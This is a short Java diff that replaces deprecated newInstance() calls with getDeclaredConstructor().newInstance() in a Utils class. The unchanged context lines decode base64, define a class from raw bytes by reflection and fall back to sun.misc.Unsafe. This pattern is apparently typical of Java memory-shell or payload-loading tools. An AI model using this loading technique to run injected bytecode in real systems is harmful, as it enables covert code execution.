@@ -98,7 +98,7 @@ public class Utils {
         } catch (Exception e) {
             try {
                 base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
+                Object decoder = base64.getDeclaredConstructor().newInstance();
                 value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
             } catch (Exception ignored) {
             }
@@ -123,7 +123,7 @@ public class Utils {
         Class<?> clazz = (Class<?>) method.invoke(null, classLoader, className, classBytes, 0, classBytes.length);
 
         try {
-            clazz.newInstance();
+            clazz.getDeclaredConstructor().newInstance();
         } catch (Exception ignored) {
             Class<?> unsafe = Class.forName("sun.misc.Unsafe");
             Field theUnsafeField = unsafe.getDeclaredField("theUnsafe");
@@ -214,7 +214,7 @@ public class Utils {
         } catch (Exception e) {
             try {
                 base64 = Class.forName("sun.misc.BASE64Encoder");
-                Object Encoder = base64.newInstance();
+                Object Encoder = base64.getDeclaredConstructor().newInstance();
                 value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
             } catch (Exception ignored) {
             }
